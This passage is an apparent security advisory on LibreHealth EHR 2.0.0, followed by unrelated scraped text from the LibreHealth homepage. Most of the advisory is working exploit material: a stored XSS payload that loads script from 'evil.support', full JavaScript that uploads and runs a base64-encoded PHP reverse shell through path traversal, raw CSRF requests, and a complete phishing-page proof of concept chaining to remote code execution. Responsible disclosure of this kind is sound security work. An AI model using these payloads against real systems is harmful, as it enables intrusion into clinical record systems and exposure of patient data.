While authenticated to the LibreHealth EHR application as a low-privileged `Front Desk` user, a note was created within the New Documents section of the application containing the following XSS payload:

```
<img src=x onerror=jQuery.getScript('http://evil.support/e.js')>
```

In the payload above, the `e.js` file is a JavaScript file that sends two requests: the first uploads a PHP reverse shell, and the second executes it. These requests exploited the known insecure upload vulnerability ([CVE-2018-1000649](https://nvd.nist.gov/vuln/detail/CVE-2018-1000649)) and the Local File Inclusion vulnerability described above. A POST request was sent that stored the XSS payload in the note, as shown below:

```
POST /librehealthehr/controller.php?document¬e&patient_id=00& HTTP/1.1
Host: libre.test.mg.gy
…omitted for brevity…
provide_email=&identifier=no¬e<mark>=%3Cimg+src%3Dx+onerror%3DjQuery.getScript%28%27http%3A%2F%2Fevil.support%2Fe.js%27%29%3E</mark>&process=true&foreign_id=1868

```

***Figure 10** - Request to set XSS*

Once the payload was sent, it would execute and load the external `e.js` JavaScript file whenever any authenticated user viewed the notes on the affected document. The XSS payload execution is shown below:

![XSS executing](https://know.bishopfox.com/hubfs/200713%20libre%20fig%2011.png)

Figure 11 - XSS executing

The reverse shell connected back to the attacking server. In this case, `localhost` was used for testing:

![PHP reverse shell connection received](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/libre-12.jpeg)

Figure 12 - PHP reverse shell connection received

Code execution was demonstrated to show the high-risk nature of XSS and how it can be chained with other vulnerabilities. An attacker could force any client-side action on behalf of authenticated users, so this issue could also be leveraged for privilege escalation within the application. The contents of the entire external JavaScript payload (`e.js`) are shown below:

```
// XSS Payload LibreHealth v2.0.0
// XSS -> Insecure File upload -> Path Traversal === RCE
// Author: Malaphar

(async () => {
   // Defined Path, Filename and PHP Code (shell) - Shell is Msfvenom generated PHP reverse shell, base64 encoded
   let shell = "<?php eval(base64_decode('ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CiAgICAgICRkaXM9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAgIGlmKCFlbXB0eSgkZGlzKSl7CiAgICAgICAgJGRpcz1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRkaXMpOwogICAgICAgICRkaXM9ZXhwbG9kZSgnLCcsICRkaXMpOwogICAgICAgICRkaXM9YXJyYXlfbWFwKCd0cmltJywgJGRpcyk7CiAgICAgIH1lbHNlewogICAgICAgICRkaXM9YXJyYXkoKTsKICAgICAgfQogICAgICAKICAgICRpcGFkZHI9J2xvY2FsaG9zdCc7CiAgICAkcG9ydD00NDQ3OwoKICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ0p0SWRKSCcpKXsKICAgICAgZnVuY3Rpb24gSnRJZEpIKCRjKXsKICAgICAgICBnbG9iYWwgJGRpczsKICAgICAgICAKICAgICAgaWYgKEZBTFNFICE9PSBzdHJwb3Moc3RydG9sb3dlcihQSFBfT1MpLCAnd2luJyApKSB7CiAgICAgICAgJGM9JGMuIiAyPiYxXG4iOwogICAgICB9CiAgICAgICRZWkJkPSdpc19jYWxsYWJsZSc7CiAgICAgICRxSXRVTmFJPSdpbl9hcnJheSc7CiAgICAgIAogICAgICBpZigkWVpCZCgncHJvY19vcGVuJylhbmQhJHFJdFVOYUkoJ3Byb2Nfb3BlbicsJGRpcykpewogICAgICAgICRoYW5kbGU9cHJvY19vcGVuKCRjLGFycmF5KGFycmF5KCdwaXBlJywncicpLGFycmF5KCdwaXBlJywndycpLGFycmF5KCdwaXBlJywndycpKSwkcGlwZXMpOwogICAgICAgICRvPU5VTEw7CiAgICAgICAgd2hpbGUoIWZlb2YoJHBpcGVzWzFdKSl7CiAgICAgICAgICAkby49ZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwogICAgICAgIH0KICAgICAgICBAcHJvY19jbG9zZSgkaGFuZGxlKTsKICAgICAgfWVsc2UKICAgICAgaWYoJFlaQmQoJ2V4ZWMnKWFuZCEkcUl0VU5hSSgnZXhlYycsJGRpcykpewogICAgICAgICRvPWFycmF5KCk7CiAgICAgICAgZXhlYygkYywkbyk7CiAgICAgICAgJG89am9pbihjaHIoMTApLCRvKS5jaHIoMTApOwogICAgICB9ZWxzZQogICAgICBpZigkWVpCZCgnc3lzdGVtJylhbmQhJHFJdFVOYUkoJ3N5c3RlbScsJGRpcykpewogICAgICAgIG9iX3N0YXJ0KCk7CiAgICAgICAgc3lzdGVtKCRjKTsKICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgfWVsc2UKICAgICAgaWYoJFlaQmQoJ3NoZWxsX2V4ZWMnKWFuZCEkcUl0VU5hSSgnc2hlbGxfZXhlYycsJGRpcykpewogICAgICAgICRvPXNoZWxsX2V4ZWMoJGMpOwogICAgICB9ZWxzZQogICAgICBpZigkWVpCZCgncGFzc3RocnUnKWFuZCEkcUl0VU5hSSgncGFzc3RocnUnLCRkaXMpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHBhc3N0aHJ1KCRjKTsKICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgfWVsc2UKICAgICAgaWYoJFlaQmQoJ3BvcGVuJylhbmQhJHFJdFVOYUkoJ3BvcGVuJywkZGlzKSl7CiAgICAgICAgJGZwPXBvcGVuKCRjLCdyJyk7CiAgICAgICAgJG89TlVMTDsKICAgICAgICBpZihpc19yZXNvdXJjZSgkZnApKXsKICAgICAgICAgIHdoaWxlKCFmZW9mKCRmcCkpewogICAgICAgICAgICAkby49ZnJlYWQoJGZwLDEwMjQpOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBAcGNsb3NlKCRmcCk7CiAgICAgIH1lbHNlCiAgICAgIHsKICAgICAgICAkbz0wOwogICAgICB9CiAgICAKICAgICAgICByZXR1cm4gJG87CiAgICAgIH0KICAgIH0KICAgICRub2Z1bmNzPSdubyBleGVjIGZ1bmN0aW9ucyc7CiAgICBpZihpc19jYWxsYWJsZSgnZnNvY2tvcGVuJylhbmQhaW5fYXJyYXkoJ2Zzb2Nrb3BlbicsJGRpcykpewogICAgICAkcz1AZnNvY2tvcGVuKCJ0Y3A6Ly9sb2NhbGhvc3QiLCRwb3J0KTsKICAgICAgd2hpbGUoJGM9ZnJlYWQoJHMsMjA0OCkpewogICAgICAgICRvdXQgPSAnJzsKICAgICAgICBpZihzdWJzdHIoJGMsMCwzKSA9
PSAnY2QgJyl7CiAgICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgICAgYnJlYWs7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAkb3V0PUp0SWRKSChzdWJzdHIoJGMsMCwtMSkpOwogICAgICAgICAgaWYoJG91dD09PWZhbHNlKXsKICAgICAgICAgICAgZndyaXRlKCRzLCRub2Z1bmNzKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZ3cml0ZSgkcywkb3V0KTsKICAgICAgfQogICAgICBmY2xvc2UoJHMpOwogICAgfWVsc2V7CiAgICAgICRzPUBzb2NrZXRfY3JlYXRlKEFGX0lORVQsU09DS19TVFJFQU0sU09MX1RDUCk7CiAgICAgIEBzb2NrZXRfY29ubmVjdCgkcywkaXBhZGRyLCRwb3J0KTsKICAgICAgQHNvY2tldF93cml0ZSgkcywic29ja2V0X2NyZWF0ZSIpOwogICAgICB3aGlsZSgkYz1Ac29ja2V0X3JlYWQoJHMsMjA0OCkpewogICAgICAgICRvdXQgPSAnJzsKICAgICAgICBpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CiAgICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgICAgYnJlYWs7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAkb3V0PUp0SWRKSChzdWJzdHIoJGMsMCwtMSkpOwogICAgICAgICAgaWYoJG91dD09PWZhbHNlKXsKICAgICAgICAgICAgQHNvY2tldF93cml0ZSgkcywkbm9mdW5jcyk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBAc29ja2V0X3dyaXRlKCRzLCRvdXQsc3RybGVuKCRvdXQpKTsKICAgICAgfQogICAgICBAc29ja2V0X2Nsb3NlKCRzKTsKICAgIH0K')); ?>"
   let fileName = 'probablyanevilfile22.php'
   let webRootPath = '../../../'
   let evilUp = webRootPath + fileName

   // Uploads PHP shell
   console.log(`[*] Uploading PHP Shell to ${evilUp}...`)
   let fetchUp = await fetch('/librehealthehr/interface/patient_file/letter.php', {
       method: 'POST',
       credentials: 'include',
       headers: {
           'Content-Type': 'application/x-www-form-urlencoded'
       },
       body: 'formaction=savetemplate&form_pid=1337&form_from=10&form_date=2020-02-16&form_specialty=All&form_template=' + evilUp + '&form_to=4&form_format=html&form_body=' + shell + '&newtemplatename=',
   });
   if (fetchUp.ok) {
       console.log('[*] PHP Uploaded at ' + window.location.origin + `/librehealthehr/${fileName}`);
   } else {
       console.error('[!] File Failed to Upload... ')
       return
   }

   // Calls uploaded PHP for execution
   console.log('[*] Requesting PHP File for Execution...')
   let fetchPHP = await fetch('/librehealthehr/' + fileName, {
       credentials: 'include'
   });
   if (fetchPHP.ok) {
       console.log('[*] File Uploaded and Called, Got Shell?')
   } else {
       console.error('[!] Calling PHP Failed...')
       return
   }
})();
```

***Figure 13** -XSS payload source code*

## CROSS-SITE REQUEST FORGERY (CSRF)

The LibreHealth EHR application was affected by systemic CSRF. This CSRF vulnerability allowed any POST request in the application to be sent from arbitrary origins. This would allow a phishing application to send requests on behalf of authenticated LibreHealth users. The CSRF was chained with the known insecure file upload issue to show how an unauthenticated remote attacker could gain server-side remote code execution (RCE) through this vulnerability.

| **CVE ID** | **Security Risk** | **Impact** | **Access Vector** |
| --- | --- | --- | --- |
| [CVE-2020-11438](https://nvd.nist.gov/vuln/detail/CVE-2020-11438) | High | Code execution, Escalation of privileges | Remote |

The LibreHealth EHR application is affected by systemic CSRF, which accepts POST requests sent from arbitrary origins. The CSRF vulnerability was chained with a known insecure file upload issue ([CVE-2018-1000649](https://nvd.nist.gov/vuln/detail/CVE-2018-1000649)) to show how an unauthenticated remote attacker could gain server-side remote code execution (RCE) through this vulnerability.

To demonstrate the CSRF vulnerability, a phishing page was created that would send two requests on behalf of an authenticated LibreHealth EHR user who viewed it. The first request uploaded a PHP reverse shell, as shown below:

```
POST /librehealthehr/interface/patient_file/letter.php
HTTP/1.1
Host: libre.test.mg.gy
…omitted for brevity…
Content-Type: application/x-www-form-urlencoded
<mark>Origin: null</mark>
Cookie: TreeMenuBranchStatus=objTreeMenu_1_node_1_1:objTreeMenu_1_node_1_7:objTreeMenu_1_node_1_8:objTreeMenu_1_node_1_7_1; LibreHealthEHR=qfscakukd97ra7rfmq2umnhjn3

formaction=savetemplate&form_pid=1337&form_from=10&form_date=2020-02-16&form_specialty=All&form_template<mark>=../../../evilfromCSRF.php</mark>&form_to=4&form_format=html&form_body=<strong><?php eval(base64_decode('ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgIC …omitted for brevity… IH0K')); ?>&</strong>newtemplatename=
```

***Figure 14** - Request made from CSRF phishing page*

The second request called the uploaded PHP reverse shell to execute it, shown below:

```
GET /librehealthehr/evilfromCSRF.php HTTP/1.1
Host: libre.test.mg.gy
Origin: null
…omitted for brevity…
```

***Figure 15** - Second request made from CSRF phishing page*

The HTML phishing page was tested on the local filesystem, hence the null origin in the figure above.

The result of these two requests made from the CSRF phishing page was a PHP reverse shell connection, which is demonstrated in the cross-site scripting finding of this advisory. The complete HTML and JavaScript code used for the proof-of-concept phishing page shown below:

```
<!DOCTYPE html>
<html>
   <head>
       <title>Phishing</title>
   </head>
   <body>
       <script>
(async () => {
   // Defined Path, Filename and PHP Code (shell)
   // Just a modified version of the XSS payload adapted to CSRF
   let shell = "<?php eval(base64_decode('ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CiAgICAgICRkaXM9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAgIGlmKCFlbXB0eSgkZGlzKSl7CiAgICAgICAgJGRpcz1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRkaXMpOwogICAgICAgICRkaXM9ZXhwbG9kZSgnLCcsICRkaXMpOwogICAgICAgICRkaXM9YXJyYXlfbWFwKCd0cmltJywgJGRpcyk7CiAgICAgIH1lbHNlewogICAgICAgICRkaXM9YXJyYXkoKTsKICAgICAgfQogICAgICAKICAgICRpcGFkZHI9J2xvY2FsaG9zdCc7CiAgICAkcG9ydD00NDQ3OwoKICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ0p0SWRKSCcpKXsKICAgICAgZnVuY3Rpb24gSnRJZEpIKCRjKXsKICAgICAgICBnbG9iYWwgJGRpczsKICAgICAgICAKICAgICAgaWYgKEZBTFNFICE9PSBzdHJwb3Moc3RydG9sb3dlcihQSFBfT1MpLCAnd2luJyApKSB7CiAgICAgICAgJGM9JGMuIiAyPiYxXG4iOwogICAgICB9CiAgICAgICRZWkJkPSdpc19jYWxsYWJsZSc7CiAgICAgICRxSXRVTmFJPSdpbl9hcnJheSc7CiAgICAgIAogICAgICBpZigkWVpCZCgncHJvY19vcGVuJylhbmQhJHFJdFVOYUkoJ3Byb2Nfb3BlbicsJGRpcykpewogICAgICAgICRoYW5kbGU9cHJvY19vcGVuKCRjLGFycmF5KGFycmF5KCdwaXBlJywncicpLGFycmF5KCdwaXBlJywndycpLGFycmF5KCdwaXBlJywndycpKSwkcGlwZXMpOwogICAgICAgICRvPU5VTEw7CiAgICAgICAgd2hpbGUoIWZlb2YoJHBpcGVzWzFdKSl7CiAgICAgICAgICAkby49ZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwogICAgICAgIH0KICAgICAgICBAcHJvY19jbG9zZSgkaGFuZGxlKTsKICAgICAgfWVsc2UKICAgICAgaWYoJFlaQmQoJ2V4ZWMnKWFuZCEkcUl0VU5hSSgnZXhlYycsJGRpcykpewogICAgICAgICRvPWFycmF5KCk7CiAgICAgICAgZXhlYygkYywkbyk7CiAgICAgICAgJG89am9pbihjaHIoMTApLCRvKS5jaHIoMTApOwogICAgICB9ZWxzZQogICAgICBpZigkWVpCZCgnc3lzdGVtJylhbmQhJHFJdFVOYUkoJ3N5c3RlbScsJGRpcykpewogICAgICAgIG9iX3N0YXJ0KCk7CiAgICAgICAgc3lzdGVtKCRjKTsKICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgfWVsc2UKICAgICAgaWYoJFlaQmQoJ3NoZWxsX2V4ZWMnKWFuZCEkcUl0VU5hSSgnc2hlbGxfZXhlYycsJGRpcykpewogICAgICAgICRvPXNoZWxsX2V4ZWMoJGMpOwogICAgICB9ZWxzZQogICAgICBpZigkWVpCZCgncGFzc3RocnUnKWFuZCEkcUl0VU5hSSgncGFzc3RocnUnLCRkaXMpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHBhc3N0aHJ1KCRjKTsKICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgfWVsc2UKICAgICAgaWYoJFlaQmQoJ3BvcGVuJylhbmQhJHFJdFVOYUkoJ3BvcGVuJywkZGlzKSl7CiAgICAgICAgJGZwPXBvcGVuKCRjLCdyJyk7CiAgICAgICAgJG89TlVMTDsKICAgICAgICBpZihpc19yZXNvdXJjZSgkZnApKXsKICAgICAgICAgIHdoaWxlKCFmZW9mKCRmcCkpewogICAgICAgICAgICAkby49ZnJlYWQoJGZwLDEwMjQpOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBAcGNsb3NlKCRmcCk7CiAgICAgIH1lbHNlCiAgICAgIHsKICAgICAgICAkbz0wOwogICAgICB9CiAgICAKICAgICAgICByZXR1cm4gJG87CiAgICAgIH0KICAgIH0KICAgICRub2Z1bmNzPSdubyBleGVjIGZ1bmN0aW9ucyc7CiAgICBpZihpc19jYWxsYWJsZSgnZnNvY2tvcGVuJylhbmQhaW5fYXJyYXkoJ2Zzb2Nrb3BlbicsJGRpcykpewogICAgICAkcz1AZnNvY2tvcGVuKCJ0Y3A6Ly9sb2NhbGhvc3QiLCRwb3J0KTsKICAgICAgd2hpbGUoJGM9ZnJlYWQoJHMsMjA0OCkpewogICAgICAgICRvdXQgPSAnJzsKICAgICAgICBpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CiAgICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgICAgYnJlYWs7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAkb3V0PUp0SWRKSChzdWJzdHIoJGMsMCwtMSkpOwogICAgICAgICAgaWYoJG91dD09PWZhbHNlKXsKICAgICAgICAgICAgZndyaXRlKCRzLCRub2Z1bmNzKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZ3cml0ZSgkcywkb3V0KTsKICAgICAgfQogICAgICBmY2xvc2UoJHMpOwogICAgfWVsc2V7CiAgICAgICRzPUBzb2NrZXRfY3JlYXRlKEFGX0lORVQsU09DS19TVFJFQU0sU09MX1RDUCk7CiAgICAgIEBzb2NrZXRfY29ubmVjdCgkcywkaXBhZGRyLCRwb3J0KTsKICAgICAgQHNvY2tldF93cml0ZSgkcywic29ja2V0X2NyZWF0ZSIpOwogICAgICB3aGlsZSgkYz1Ac29ja2V0X3JlYWQoJHMsMjA0OCkpewogICAgICAgICRvdXQgPSAnJzsKICAgICAgICBpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CiAgICAgICAgICBjaGRpcihzdWJzdHIoJGMsMywtMSkpOwogICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgewogICAgICAgICAgYnJlYWs7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAkb3V0PUp0SWRKSChzdWJzdHIoJGMsMCwtMSkpOwogICAgICAgICAgaWYoJG91dD09PWZhbHNlKXsKICAgICAgICAgICAgQHNvY2tldF93cml0ZSgkcywkbm9mdW5jcyk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBAc29ja2V0X3dyaXRlKCRzLCRvdXQsc3RybGVuKCRvdXQpKTsKICAgICAgfQogICAgICBAc29ja2V0X2Nsb3NlKCRzKTsKICAgIH0K')); ?>"
   let fileName = 'evilfromCSRF.php'
   let webRootPath = '../../../'
   let evilUp = webRootPath + fileName

   // Uploads PHP shell
   console.log(`[*] Uploading PHP Shell to ${evilUp}...`)
   let fetchUp = fetch('http://libre.test.mg.gy/librehealthehr/interface/patient_file/letter.php', {
       method: 'POST',
       credentials: 'include',
       headers: {
           'Content-Type': 'application/x-www-form-urlencoded'
       },
       body: 'formaction=savetemplate&form_pid=1337&form_from=10&form_date=2020-02-16&form_specialty=All&form_template=' + evilUp + '&form_to=4&form_format=html&form_body=' + shell + '&newtemplatename=',
   });

   // Calls PHP - Potential race condition with the requests. However, testing went well so not bothering to do an await or settimeout
   console.log('[*] Requesting PHP File for Execution...')
   let fetchPHP = fetch('http://libre.test.mg.gy/librehealthehr/' + fileName, {
        credentials: 'include'
   });
})();
       </script>
   </body>
</html>
```

***Figure 16** - CSRF phishing page source code*

The LibreHealth EHR application was systemically vulnerable to CSRF, so any POST action could be exploited through this vulnerability except for the functionality to create or modify users; those features required an administrative user password to be included in the request.

## CREDITS

[Chris Davis](https://bishopfox.com/authors/chris-davis), Security Consultant, Bishop Fox ([[email protected]](/cdn-cgi/l/email-protection#ec8f888d9a859fac8e859f84839c8a8394c28f8381))

Jake Yamaki, Senior Security Consultant, Bishop Fox ([[email protected]](/cdn-cgi/l/email-protection#4c26352d212d27250c2e253f24233c2a2334622f2321))

## TIMELINE

* Initial Discovery: 02/26/2020
* Contact With Vendor: 03/12/2020
* Vendor Acknowledged Vulnerabilities: 03/16/2020
* Bishop Fox Offered 30 Day Extension from 90 Day Policy due to Covid-19: 03/19/2020
* Vendor Accepted Extension: 03/19/2020
* Bishop Fox Contacted Vendor: 06/22/2020
* Vendor Response - Fixes Ongoing: 06/26/2020
* Bishop Fox Contacted Vendor: 07/09/2020
* Vendor Shared In-progress Patches - Agreed on Disclosure Date: 07/14/2020
* Vulnerabilities Publicly Disclosed: 07/14/2020

Subscribe to Bishop Fox's Security Blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.

---

![Chris davis](https://assets.bishopfox.com/prod-1437/Images/headshots/chris-davis.jpg)

About the author,
Chris Davis

Senior Security Consultant

| Chris Davis is a Senior Security Consultant at Bishop Fox. His areas of expertise are application penetration testing (static and dynamic) and external network penetration testing.  Chris actively conducts independent security research and has been credited with the discovery of 40 CVEs (including CVE-2019-7551 and CVE-2018-17150) on enterprise-level, highly distributed software. The vulnerabilities he identified included remote code execution and cross-site scripting (XSS). |
| --- |

[More by Chris](https://bishopfox.com/authors/chris-davis)

### Recommended Posts

## You might be interested in these related posts.

[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Featured_Tile_2024-12-12-205929_kppy.jpg)

Dec 13, 2024

Current State of SonicWall Exposure: Firmware Decryption Unlocks New Insights](https://bishopfox.com/blog/state-sonicwall-exposure-firmware-decryption-unlocks-insights)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/SonicWall-hadware-part1_Featured_Tile.jpg)

Dec 02, 2024

Sonicwall Firmware Deep Dive - Part 1](https://bishopfox.com/blog/sonicwall-firmware-deep-dive-part-1)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Bishop-Fox-Blog-Fortijump.jpg)

Nov 01, 2024

A Brief Look at FortiJump (FortiManager CVE-2024-47575)](https://bishopfox.com/blog/a-look-at-fortijump-cve-2024-47575)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/advisories-risk-level/High-Risk-Advisory-Featured.jpg)

Jul 02, 2024

Traeger Grill D2 Wi-Fi Controller, Version 2.02.04](https://bishopfox.com/blog/traeger-wifi-controller-advisory)

* [Cosmos Platform](/cosmos)
* [Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)
* [Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)
* [Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

* [Services](/services)
* [Application Security](/services/application-security)
* [Cloud Security](/services/cloud-penetration-testing)
* [IoT & Product Security](/services/product-security-review)
* [Network Security](/services/network-security)
* [Red Team & Readiness](/services/red-teaming)
* [Compliance, Regulations, & Frameworks](/services/compliance-and-frameworks)
* [Google, Facebook, & Amazon Partner Assessments](/services/vendor-assessments)

* [Resources](/resources)
* [Resource Center](/resource-center)
* [Blog](/blog)
* [Advisories](/blog/advisories)
* [Tools](/tools)

* [Our Customers](/customers)
* [Our Customer Stories](/resources/customer-stories)

* [Partners](/partners)
* [Partner Programs](/partners)
* [Partner Directory](/partner-directory)
* [Become a Partner](/partners/become-a-partner)

* [Company](/company)
* [About Us](/company)
* [Careers
  We're Hiring](/careers)
* [Events](/events)
* [Newsroom](/news)
* [Bishop Fox Mexico](/mexico)
* [Bishop Fox Labs](/labs)
* [Contact Us](/contact)

Copyright © 2025 Bishop Fox

[Privacy Statement](https://bishopfox.com/privacy-statement)
[Responsible Disclosure Policy](https://bishopfox.com/vulnerability-disclosure-policy)

This site uses cookies to provide you with a great user experience. By continuing to use our website, you consent to the use of cookies. To find out more about the cookies we use, please see our [Privacy Policy](https://bishopfox.com/privacy-statement).

Accept



=== Content from librehealth.io_fe48f493_20250119_124417.html ===

[![LibreHealth logo](https://librehealth.io/img/logo.png)
![LibreHealth logo](https://librehealth.io/img/logo-small.png)
LibreHealth - go to homepage](https://librehealth.io/)
Toggle navigation

* [Home](https://librehealth.io/)
* Projects
  + [LibreHealth EHR](https://librehealth.io/projects/lh-ehr)
  + [LibreHealth Radiology](https://librehealth.io/projects/lh-radiology)
  + [LibreHealth Toolkit](https://librehealth.io/projects/lh-toolkit)
* Teams
  + [Diversity & Inclusion](https://librehealth.io/teams/diversity)
  + [Documentation](https://librehealth.io/teams/documentation)
  + [Education & University Outreach](https://librehealth.io/teams/education)
  + [LibreHealth Infrastructure Team](https://librehealth.io/teams/infrastructure)
  + [LibreHealth Steering Committee](https://librehealth.io/teams/lsc)
* community
  + [Chat](https://chat.librehealth.io/)
  + [Forums](https://forums.librehealth.io/)
* [demos](https://librehealth.io/demos)
* contribute
  + [Contribute code](https://gitlab.com/librehealth)
  + [Contribute documentation](https://gitlab.com/librehealth)
  + [Donate money](https://librehealth.io/donate)

## LibreHealth EHR

* The LibreHealth EHR application is a clinically-focused electronic health record (EHR) system designed to be both easy to use "out of the box" and also customizable for use in a variety of health care settings.

![](img/carousel/librehealth-EHR.png)

## LibreHealth Radiology

* The LibreHealth Radiology is an open source Radiology Information System, that is written for the LibreHealth Toolkit and manages the clinical workflow of a radiology department.

![](img/carousel/radiology-info-sys.png)

## LibreHealth toolkit

* The LibreHealth Toolkit software serves as the foundational API and data model for Health IT applications

![](img/carousel/LH-REST-screen.png)

## LibreHealth toolkit API

* The LibreHealth Toolkit has a powerful REST API along with web components that can be assembled by non-developers to create Health Information Systems that puts patient care in the forefront.

![](img/carousel/LH-REST-screen.png)

### Meritocracy

The LibreHealth community is a meritocracy. The more you contribute, the more responsibility you will earn. Leadership roles in LibreHealth are also merit-based and earned by peer acclaim.

### Openness

LibreHealth is open to all individuals in their individual capacities, and provides the same opportunity to all. Everyone participates with the same rules.

### Outcome-driven

No imagined needs! We focus on design, development and deployment of technology that will have measurable impact on the health of people from around the world.

### Transparency

All discussions, minutes, project plans, designs, plans for new features, and other artifacts shall be open, public, searchable, and easily accessible to everyone.

### Umbrella Organization

LibreHealth is an umbrella organization where multiple health information technology projects collaborate.

### User-Driven

LibreHealth is driven by real needs of patients and last-mile clinicians who want to improve health and health service delivery

### Project Source Code

This web site is brand new and growing every day. Meanwhile, you'll find our projects' code published on GitLab.

[LibreHealth on GitLab](https://gitlab.com/librehealth)

## Our Team (More Names Coming Soon)

More Photos and Profiles Coming Soon!

* [![DR. JUDY GICHOYA](img/clients/person-2.png)](http://newscenter.iupui.edu/index.php?id=5626)
* ![TONY MCCORMICK](img/clients/tony.jpg)
* ![JORDAN FREITAS](img/clients/jordan.jpg)
* ![MICHAEL DOWNEY](img/clients/person-5.jpg)
* ![ADA YEUNG](img/clients/yeung.jpg)
* ![SAPTARSHI PURKAYASTHA](img/clients/sunbiz.jpg)
* ![ROBBY O'CONNOR](img/clients/rob.jpg)
* ![IVO ULRICH](img/clients/person-4.png)
* ![NYOMAN RIBEKA](img/clients/win.jpg)

#### About us

LibreHealth is collaborative community for free & open source software projects in Health IT, and is a member project of Software Freedom Conservancy.

---


